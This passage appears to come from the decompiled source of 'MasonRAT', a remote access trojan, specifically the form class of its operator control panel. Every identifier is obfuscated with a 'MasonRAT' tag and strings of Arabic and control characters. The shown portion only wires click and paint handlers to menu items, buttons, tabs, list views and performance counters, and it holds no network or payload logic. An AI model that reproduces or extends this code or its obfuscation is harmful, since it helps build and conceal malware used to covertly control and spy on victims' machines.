      ToolStripMenuItem masonRatـؤــٸ̍ــ̍̍2 = this.\u2694️MasonRAT\u270Cـؤ\u0609ــٸ\u0609̍ــ̍̍;
      if (masonRatـؤــٸ̍ــ̍̍2 == null)
        return;
      masonRatـؤــٸ̍ــ̍̍2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cﻋـڇۙ\u060Dټٸ\u060Bۧ\u0020\u060Aٸــ
  {
    get => this.\u2694️MasonRAT\u270Cٺ\u0609ﻻ\u0608ــ\u060D\u0609\u060A\u0609;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C̍\u0608ح\u0609\u0609ڙ\u060Dاٸ\u060Dڕ\u060D\u060Aٸ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cٺ\u0609ﻻ\u0608ــ\u060D\u0609\u060A\u0609;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cٺ\u0609ﻻ\u0608ــ\u060D\u0609\u060A\u0609 = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cٺ\u0609ﻻ\u0608ــ\u060D\u0609\u060A\u0609;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۚ\u0020ـ\u0608ۚـ\u0608ـ\u060A\u060Dڕـۙۏ\u060Eﯧؤــۏ
  {
    get => this.\u2694️MasonRAT\u270C\u060A\u060B\u060Dڙــ\u0609ۙ\u0020ۡ\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cټــﻼ\u0609ــد\u0609ــۏ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u060A\u060B\u060Dڙــ\u0609ۙ\u0020ۡ\u060D;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060A\u060B\u060Dڙــ\u0609ۙ\u0020ۡ\u060D = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u060A\u060B\u060Dڙــ\u0609ۙ\u0020ۡ\u060D;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cژـ\u0609گ\u0608\u060Aـټۚـڣ
  {
    get => this.\u2694️MasonRAT\u270Cـڙـ\u060Aۧﻋ\u060C\u060Bۧ\u060Fټ\u0609ٽ\u0609ڙ\u060Bۛٺ\u060Bٻ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aۙڙ\u060Cـ\u0020ْ\u060Fڙٸ);
      ToolStripMenuItem masonRatـڙـۧﻋۧټٽڙۛٺٻ1 = this.\u2694️MasonRAT\u270Cـڙـ\u060Aۧﻋ\u060C\u060Bۧ\u060Fټ\u0609ٽ\u0609ڙ\u060Bۛٺ\u060Bٻ;
      if (masonRatـڙـۧﻋۧټٽڙۛٺٻ1 != null)
        masonRatـڙـۧﻋۧټٽڙۛٺٻ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـڙـ\u060Aۧﻋ\u060C\u060Bۧ\u060Fټ\u0609ٽ\u0609ڙ\u060Bۛٺ\u060Bٻ = value;
      ToolStripMenuItem masonRatـڙـۧﻋۧټٽڙۛٺٻ2 = this.\u2694️MasonRAT\u270Cـڙـ\u060Aۧﻋ\u060C\u060Bۧ\u060Fټ\u0609ٽ\u0609ڙ\u060Bۛٺ\u060Bٻ;
      if (masonRatـڙـۧﻋۧټٽڙۛٺٻ2 == null)
        return;
      masonRatـڙـۧﻋۧټٽڙۛٺٻ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـــڅ\u060A\u060B\u060Fٽةۜؤـ\u060Aـ\u060Aـ\u060Dـ
  {
    get => this.\u2694️MasonRAT\u270Cـــڙىڙ\u060Dۙڙـ\u0609\u0608\u060Eـڙ\u060Eـــڝ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060Dـڙ\u060Aۙـ\u0609ٺبﻋ\u060D\u060F);
      ToolStripMenuItem ratـــڙىڙۙڙــڙـــڝ1 = this.\u2694️MasonRAT\u270Cـــڙىڙ\u060Dۙڙـ\u0609\u0608\u060Eـڙ\u060Eـــڝ;
      if (ratـــڙىڙۙڙــڙـــڝ1 != null)
        ratـــڙىڙۙڙــڙـــڝ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـــڙىڙ\u060Dۙڙـ\u0609\u0608\u060Eـڙ\u060Eـــڝ = value;
      ToolStripMenuItem ratـــڙىڙۙڙــڙـــڝ2 = this.\u2694️MasonRAT\u270Cـــڙىڙ\u060Dۙڙـ\u0609\u0608\u060Eـڙ\u060Eـــڝ;
      if (ratـــڙىڙۙڙــڙـــڝ2 == null)
        return;
      ratـــڙىڙۙڙــڙـــڝ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("performanceCounter2")]
  private virtual PerformanceCounter \u2694️MasonRAT\u270Cڕـۙۏ\u060Aژـﮪ\u0608ـ\u060Dڛــٻ\u060Cڝـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("performanceCounter1")]
  private virtual PerformanceCounter \u2694️MasonRAT\u270Cــۧڅﮪ\u060D\u0609ـــ\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڙئئ\u060Aح̍\u0609ؤۧۏ\u060Aﻼح\u060B\u0608\u060A
  {
    get => this.\u2694️MasonRAT\u270C̍ـ\u0609ۙ\u060Fـﻋ̍ــ\u0608ـ\u060Aـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C̍\u060Dدٻڙ\u060D\u060A\u060Bڙۜۡڙ);
      ToolStripMenuItem masonRat̍ـۙـﻋ̍ــــ1 = this.\u2694️MasonRAT\u270C̍ـ\u0609ۙ\u060Fـﻋ̍ــ\u0608ـ\u060Aـ;
      if (masonRat̍ـۙـﻋ̍ــــ1 != null)
        masonRat̍ـۙـﻋ̍ــــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C̍ـ\u0609ۙ\u060Fـﻋ̍ــ\u0608ـ\u060Aـ = value;
      ToolStripMenuItem masonRat̍ـۙـﻋ̍ــــ2 = this.\u2694️MasonRAT\u270C̍ـ\u0609ۙ\u060Fـﻋ̍ــ\u0608ـ\u060Aـ;
      if (masonRat̍ـۙـﻋ̍ــــ2 == null)
        return;
      masonRat̍ـۙـﻋ̍ــــ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ii")]
  internal virtual ImageList \u2694️MasonRAT\u270C̨\u060Cح\u060F\u0609ۡڙ\u060Aـڛٸـ\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Lv2")]
  internal virtual LV \u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader12")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u060Fټۡڙ\u060Aڕ\u060Cـٺ\u060Aـۏڟڙـبڜ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader13")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C̍طــ\u060Dﻋ\u060Eا\u060Fﮪٻ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader14")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cڠ\u0609ټـٺ\u060Fدڛﻻ\u060A\u0020ؤ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ContextMenuStrip1")]
  internal virtual ContextMenuStrip \u2694️MasonRAT\u270Cط\u060B\u060E\u060Cــ\u060Dﻋۏـۡ\u060E؁ـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٺــْب\u0609ـڙﻻـ\u0608ـﻻ\u0609ـۙٻ
  {
    get => this.\u2694️MasonRAT\u270C\u0608\u060E\u060Dـطــۛ\u0608حٸ\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060C\u060Aـڜٽ\u060Aــــ\u0609ژـ\u060A\u0609ٸ\u0608);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u0608\u060E\u060Dـطــۛ\u0608حٸ\u060D;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608\u060E\u060Dـطــۛ\u0608حٸ\u060D = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u0608\u060E\u060Dـطــۛ\u0608حٸ\u060D;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ColumnHeader15")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u0609ڼـ\u060Eټـ\u060Aـْـۧدـ\u0608ۧ\u060Aـ\u060Dـ\u060D { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("BlockToolStripMenuItem1")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۚ\u060F\u060Bـدئؤـب\u060D\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060B\u0609\u060A\u0608ټﯧ\u060Aـ̍ـ\u0609ــ\u060B\u060Bﻻ
  {
    get => this.\u2694️MasonRAT\u270Cؤـٺ\u060Eـٽ\u0609ۏـ\u0608ــٺ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cژةۭٺڙ\u060Bـﻋ؁ﮪڙﻋ);
      ToolStripMenuItem masonRatؤـٺـٽۏـــٺ1 = this.\u2694️MasonRAT\u270Cؤـٺ\u060Eـٽ\u0609ۏـ\u0608ــٺ;
      if (masonRatؤـٺـٽۏـــٺ1 != null)
        masonRatؤـٺـٽۏـــٺ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cؤـٺ\u060Eـٽ\u0609ۏـ\u0608ــٺ = value;
      ToolStripMenuItem masonRatؤـٺـٽۏـــٺ2 = this.\u2694️MasonRAT\u270Cؤـٺ\u060Eـٽ\u0609ۏـ\u0608ــٺ;
      if (masonRatؤـٺـٽۏـــٺ2 == null)
        return;
      masonRatؤـٺـٽۏـــٺ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060A\u0608ـححۧبةـح\u060Aﯧــ
  {
    get => this.\u2694️MasonRAT\u270Cـٺـدٽــۙددءـ\u060Aﻋــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cبٸﯧــڙـ\u060Cــ\u060Cدــﯧ\u060F\u060F\u060E);
      ToolStripMenuItem ratـٺـدٽــۙددءـﻋــ1 = this.\u2694️MasonRAT\u270Cـٺـدٽــۙددءـ\u060Aﻋــ;
      if (ratـٺـدٽــۙددءـﻋــ1 != null)
        ratـٺـدٽــۙددءـﻋــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـٺـدٽــۙددءـ\u060Aﻋــ = value;
      ToolStripMenuItem ratـٺـدٽــۙددءـﻋــ2 = this.\u2694️MasonRAT\u270Cـٺـدٽــۙددءـ\u060Aﻋــ;
      if (ratـٺـدٽــۙددءـﻋــ2 == null)
        return;
      ratـٺـدٽــۙددءـﻋــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Cـ\u0608ـڙـڟـ\u0020ـڙ\u060Cب\u060Aﮪـ\u060A\u0020
  {
    get => this.\u2694️MasonRAT\u270Cـ\u0020\u0609\u0609\u0609ـ\u060Aـ̍ــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060B\u0608ئ̨\u060Bڕٻﻼڙ\u0609\u060A\u060Eڛټـ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cـ\u0020\u0609\u0609\u0609ـ\u060Aـ̍ــ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u0020\u0609\u0609\u0609ـ\u060Aـ̍ــ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cـ\u0020\u0609\u0609\u0609ـ\u060Aـ̍ــ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙ\u0609ڙ\u060Aــۧ\u060A\u0608\u060Bڅ\u060Aئ
  {
    get => this.\u2694️MasonRAT\u270Cڇـ\u0608ڙـ\u060Fﮪ\u060D̍ٺ\u0609\u0020؁ؤحـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cﯧ\u060B\u0020ـٸٺﻋـ\u0608̍ڟ\u0020ڟ؁ۡۙ);
      ToolStripMenuItem masonRatڇـڙـﮪ̍ٺ؁ؤحـ1 = this.\u2694️MasonRAT\u270Cڇـ\u0608ڙـ\u060Fﮪ\u060D̍ٺ\u0609\u0020؁ؤحـ;
      if (masonRatڇـڙـﮪ̍ٺ؁ؤحـ1 != null)
        masonRatڇـڙـﮪ̍ٺ؁ؤحـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڇـ\u0608ڙـ\u060Fﮪ\u060D̍ٺ\u0609\u0020؁ؤحـ = value;
      ToolStripMenuItem masonRatڇـڙـﮪ̍ٺ؁ؤحـ2 = this.\u2694️MasonRAT\u270Cڇـ\u0608ڙـ\u060Fﮪ\u060D̍ٺ\u0609\u0020؁ؤحـ;
      if (masonRatڇـڙـﮪ̍ٺ؁ؤحـ2 == null)
        return;
      masonRatڇـڙـﮪ̍ٺ؁ؤحـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2Elipse1")]
  internal virtual Guna2Elipse \u2694️MasonRAT\u270Cــۛڙــژڇۡﻻـــ\u0020ـ\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2TabControl1")]
  internal virtual Guna2TabControl \u2694️MasonRAT\u270C\u060Dةﮪ\u0609ـټ\u0609ْ\u0609̍ــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("TabPage1")]
  internal virtual TabPage \u2694️MasonRAT\u270Cﻋ\u060Dﻋـ\u0609ـــــگــ\u060A̍ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual TabPage \u2694️MasonRAT\u270Cڙﻋۡ\u0609ٺبـٽٽﻻﯧ
  {
    get => this.\u2694️MasonRAT\u270C\u0608ۜ\u0608ىـڞـּ\u060Dۨڙـ؁\u060Aدـ\u060C\u0609\u060Eا;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C̍\u060Fْڛژ\u060A\u0609ٺـڙ);
      TabPage ratۜىـڞـּۨڙـ؁دـا1 = this.\u2694️MasonRAT\u270C\u0608ۜ\u0608ىـڞـּ\u060Dۨڙـ؁\u060Aدـ\u060C\u0609\u060Eا;
      if (ratۜىـڞـּۨڙـ؁دـا1 != null)
        ratۜىـڞـּۨڙـ؁دـا1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608ۜ\u0608ىـڞـּ\u060Dۨڙـ؁\u060Aدـ\u060C\u0609\u060Eا = value;
      TabPage ratۜىـڞـּۨڙـ؁دـا2 = this.\u2694️MasonRAT\u270C\u0608ۜ\u0608ىـڞـּ\u060Dۨڙـ؁\u060Aدـ\u060C\u0609\u060Eا;
      if (ratۜىـڞـּۨڙـ؁دـا2 == null)
        return;
      ratۜىـڞـּۨڙـ؁دـا2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2HtmlLabel1")]
  internal virtual Guna2HtmlLabel \u2694️MasonRAT\u270Cــټ\u060A\u0020\u0609ح\u060B\u0608\u060Dـ\u060Dـ̍\u060Dڠب { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2PictureBox \u2694️MasonRAT\u270Cٸبٽﻋﻻ̍\u0608ــּۡڙ\u060Dـ\u060Aٸ
  {
    get => this.\u2694️MasonRAT\u270Cڟ\u060B\u060Cٺڙﻻڙﯧمْ\u060Cء\u060Fﻻ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Cڜ\u060Aٽـڞبـۨۛﻼـ̍ٺٺـټ\u0020حط);
      Guna2PictureBox masonRatڟٺڙﻻڙﯧمْءﻻ1 = this.\u2694️MasonRAT\u270Cڟ\u060B\u060Cٺڙﻻڙﯧمْ\u060Cء\u060Fﻻ;
      if (masonRatڟٺڙﻻڙﯧمْءﻻ1 != null)
        masonRatڟٺڙﻻڙﯧمْءﻻ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڟ\u060B\u060Cٺڙﻻڙﯧمْ\u060Cء\u060Fﻻ = value;
      Guna2PictureBox masonRatڟٺڙﻻڙﯧمْءﻻ2 = this.\u2694️MasonRAT\u270Cڟ\u060B\u060Cٺڙﻻڙﯧمْ\u060Cء\u060Fﻻ;
      if (masonRatڟٺڙﻻڙﯧمْءﻻ2 == null)
        return;
      masonRatڟٺڙﻻڙﯧمْءﻻ2.Click += eventHandler;
    }
  }

  internal virtual Guna2CustomGradientPanel \u2694️MasonRAT\u270Cـڜـٻمژ̍ڙ\u060D\u060A
  {
    get => this.\u2694️MasonRAT\u270Cـڅب\u060B\u060Bئـ̍\u060Eـﻻﻻٽـڼء;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      PaintEventHandler paintEventHandler = new PaintEventHandler(this.\u2694️MasonRAT\u270Cـد\u060F\u060F\u060Dڝﻻۡ\u060D\u060D\u060B\u060A\u060Eد);
      Guna2CustomGradientPanel ratـڅبئـ̍ـﻻﻻٽـڼء1 = this.\u2694️MasonRAT\u270Cـڅب\u060B\u060Bئـ̍\u060Eـﻻﻻٽـڼء;
      if (ratـڅبئـ̍ـﻻﻻٽـڼء1 != null)
        ratـڅبئـ̍ـﻻﻻٽـڼء1.Paint -= paintEventHandler;
      this.\u2694️MasonRAT\u270Cـڅب\u060B\u060Bئـ̍\u060Eـﻻﻻٽـڼء = value;
      Guna2CustomGradientPanel ratـڅبئـ̍ـﻻﻻٽـڼء2 = this.\u2694️MasonRAT\u270Cـڅب\u060B\u060Bئـ̍\u060Eـﻻﻻٽـڼء;
      if (ratـڅبئـ̍ـﻻﻻٽـڼء2 == null)
        return;
      ratـڅبئـ̍ـﻻﻻٽـڼء2.Paint += paintEventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2CustomGradientPanel1")]
  internal virtual Guna2CustomGradientPanel \u2694️MasonRAT\u270Cۙ\u0609ْ\u0608ـﻻۨـح\u0608ڼ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2GradientButton \u2694️MasonRAT\u270C\u060F\u0608ـــٸط\u060Fٽب
  {
    get => this.\u2694️MasonRAT\u270Cﮪـ\u060F\u0609\u060A\u060Aدۧـۙڟ\u060F;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ٺا\u060Aۡٻـ\u060D\u0609\u0608ڙٻبـۧٽ\u060D);
      Guna2GradientButton guna2GradientButton1 = this.\u2694️MasonRAT\u270Cﮪـ\u060F\u0609\u060A\u060Aدۧـۙڟ\u060F;
      if (guna2GradientButton1 != null)
        guna2GradientButton1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cﮪـ\u060F\u0609\u060A\u060Aدۧـۙڟ\u060F = value;
      Guna2GradientButton guna2GradientButton2 = this.\u2694️MasonRAT\u270Cﮪـ\u060F\u0609\u060A\u060Aدۧـۙڟ\u060F;
      if (guna2GradientButton2 == null)
        return;
      guna2GradientButton2.Click += eventHandler;
    }
  }

  internal virtual Guna2GradientButton \u2694️MasonRAT\u270Cـ\u060Dـــ\u060Bٺ\u060Fﻼءٺ\u060Bحٽ̍ـۧ
  {
    get => this.\u2694️MasonRAT\u270Cدـٸ\u060Cۡـ\u0609ـةحگــۙــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـح\u060Aبۨم\u060Aۡـ\u060C);
      Guna2GradientButton ratدـٸۡــةحگــۙــ1 = this.\u2694️MasonRAT\u270Cدـٸ\u060Cۡـ\u0609ـةحگــۙــ;
      if (ratدـٸۡــةحگــۙــ1 != null)
        ratدـٸۡــةحگــۙــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cدـٸ\u060Cۡـ\u0609ـةحگــۙــ = value;
      Guna2GradientButton ratدـٸۡــةحگــۙــ2 = this.\u2694️MasonRAT\u270Cدـٸ\u060Cۡـ\u0609ـةحگــۙــ;
      if (ratدـٸۡــةحگــۙــ2 == null)
        return;
      ratدـٸۡــةحگــۙــ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2ControlBox1")]
  internal virtual Guna2ControlBox \u2694️MasonRAT\u270Cٻدٸ؁ـٸۏ\u060D\u0608ـٸم\u0609\u060Dڙـ\u0609ٺ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2GradientButton \u2694️MasonRAT\u270C\u060B\u060Aۧٻ\u060C\u060Bﻋ\u060D\u0608ٸ\u060D
  {
    get => this.\u2694️MasonRAT\u270Cدـحڙـڙـ\u060Cٻ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڝ\u060Dڙ\u0608\u060Dڼـداڝ\u0608\u060Cـ\u060B\u0609ح);
      Guna2GradientButton masonRatدـحڙـڙـٻ1 = this.\u2694️MasonRAT\u270Cدـحڙـڙـ\u060Cٻ\u060A;
      if (masonRatدـحڙـڙـٻ1 != null)
        masonRatدـحڙـڙـٻ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cدـحڙـڙـ\u060Cٻ\u060A = value;
      Guna2GradientButton masonRatدـحڙـڙـٻ2 = this.\u2694️MasonRAT\u270Cدـحڙـڙـ\u060Cٻ\u060A;
      if (masonRatدـحڙـڙـٻ2 == null)
        return;
      masonRatدـحڙـڙـٻ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2ControlBox2")]
  internal virtual Guna2ControlBox \u2694️MasonRAT\u270Cڝ\u060Cـ\u060B\u0608ـةـ\u0608ڙـٸ\u060A\u060D\u0608\u0020 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2DragControl1")]
  internal virtual Guna2DragControl \u2694️MasonRAT\u270C\u060A\u060Cـــــْم\u060D { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader16")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cڙ\u060Fءـد̨\u060Bڛڅ؁\u060Aـٸ̨\u0609\u0609ئﻻئ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader17")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u0609ۨ\u060D\u060Aڙټ\u060Aحْىﯧۚڟ\u060Cـڙـ\u060A\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual TabPage \u2694️MasonRAT\u270C\u0608ــ\u060F\u0608\u060A\u0608ــى\u060Eى\u060A\u060Aڟ
  {
    get => this.\u2694️MasonRAT\u270Cٸۙټڜـ\u060Cٺــ\u060Aـ\u060Bﻋڙـ\u0609ڙ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0020ـ\u0609\u060A\u0609ۏ\u0609\u0609\u060Eٺ);
      TabPage ratٸۙټڜـٺـــﻋڙـڙ1 = this.\u2694️MasonRAT\u270Cٸۙټڜـ\u060Cٺــ\u060Aـ\u060Bﻋڙـ\u0609ڙ\u060A;
      if (ratٸۙټڜـٺـــﻋڙـڙ1 != null)
        ratٸۙټڜـٺـــﻋڙـڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cٸۙټڜـ\u060Cٺــ\u060Aـ\u060Bﻋڙـ\u0609ڙ\u060A = value;
      TabPage ratٸۙټڜـٺـــﻋڙـڙ2 = this.\u2694️MasonRAT\u270Cٸۙټڜـ\u060Cٺــ\u060Aـ\u060Bﻋڙـ\u0609ڙ\u060A;
      if (ratٸۙټڜـٺـــﻋڙـڙ2 == null)
        return;
      ratٸۙټڜـٺـــﻋڙـڙ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2GroupBox1")]
  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cۏڕـ\u0609ـ\u0608ڙ̍ـۜ\u0609ــۛ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual GroupBox \u2694️MasonRAT\u270Cۙـ\u060Aبـ\u060D\u0608\u0609̍ـــ̍ـا
  {
    get => this.\u2694️MasonRAT\u270Cۙۧب\u060Cڦا\u060Dئﻼۡح\u060A\u060F\u060Cـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڟټּح\u060B\u060Aڙ̍ۙـٸـۨد);
      GroupBox masonRatۙۧبڦائﻼۡحـ1 = this.\u2694️MasonRAT\u270Cۙۧب\u060Cڦا\u060Dئﻼۡح\u060A\u060F\u060Cـ;
      if (masonRatۙۧبڦائﻼۡحـ1 != null)
        masonRatۙۧبڦائﻼۡحـ1.Enter -= eventHandler;
      this.\u2694️MasonRAT\u270Cۙۧب\u060Cڦا\u060Dئﻼۡح\u060A\u060F\u060Cـ = value;
      GroupBox masonRatۙۧبڦائﻼۡحـ2 = this.\u2694️MasonRAT\u270Cۙۧب\u060Cڦا\u060Dئﻼۡح\u060A\u060F\u060Cـ;
      if (masonRatۙۧبڦائﻼۡحـ2 == null)
        return;
      masonRatۙۧبڦائﻼۡحـ2.Enter += eventHandler;
    }
  }

  [field: AccessedThroughProperty("PictureBox1")]
  internal virtual PictureBox \u2694️MasonRAT\u270Cۙ\u060A\u0609ــٺ\u060C؁ؤڜـحـ\u060Eح { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual TextBox \u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ
  {
    get => this.\u2694️MasonRAT\u270Cـطـ\u060Dــڟ\u060Aۨـــد\u060Eټٽ\u0608\u060Bۙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـڙ\u0608̍\u060E\u0609ڙ\u0609بـ\u060Dﻻـﻻ\u060A\u060A\u060Eء);
      TextBox ratـطـــڟۨـــدټٽۙ1 = this.\u2694️MasonRAT\u270Cـطـ\u060Dــڟ\u060Aۨـــد\u060Eټٽ\u0608\u060Bۙ;
      if (ratـطـــڟۨـــدټٽۙ1 != null)
        ratـطـــڟۨـــدټٽۙ1.TextChanged -= eventHandler;
      this.\u2694️MasonRAT\u270Cـطـ\u060Dــڟ\u060Aۨـــد\u060Eټٽ\u0608\u060Bۙ = value;
      TextBox ratـطـــڟۨـــدټٽۙ2 = this.\u2694️MasonRAT\u270Cـطـ\u060Dــڟ\u060Aۨـــد\u060Eټٽ\u0608\u060Bۙ;
      if (ratـطـــڟۨـــدټٽۙ2 == null)
        return;
      ratـطـــڟۨـــدټٽۙ2.TextChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Label4")]
  internal virtual Label \u2694️MasonRAT\u270C\u0608ـ\u060Aڇ\u060Aڦٽٻ\u0608ــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("TextBox1")]
  internal virtual Guna2TextBox \u2694️MasonRAT\u270C\u060Aـ\u060Dـءټ\u060Aــ\u0609؁ـ\u060A\u060Fـ̍ټ\u060E { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("TextBox4")]
